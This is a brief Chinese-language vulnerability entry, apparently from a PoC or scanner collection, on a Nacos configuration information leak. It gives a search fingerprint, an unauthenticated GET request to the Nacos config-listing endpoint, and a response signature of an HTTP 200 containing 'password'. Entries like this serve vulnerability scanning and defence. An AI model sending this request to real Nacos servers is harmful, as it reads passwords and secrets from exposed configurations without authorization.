# Nacos配置信息泄露漏洞

Nacos ｜ 信息泄露 ｜ —
- **指纹**：`app="nacos"`
- **请求**：`GET /nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99 HTTP/1.1`
- **响应特征**：200 password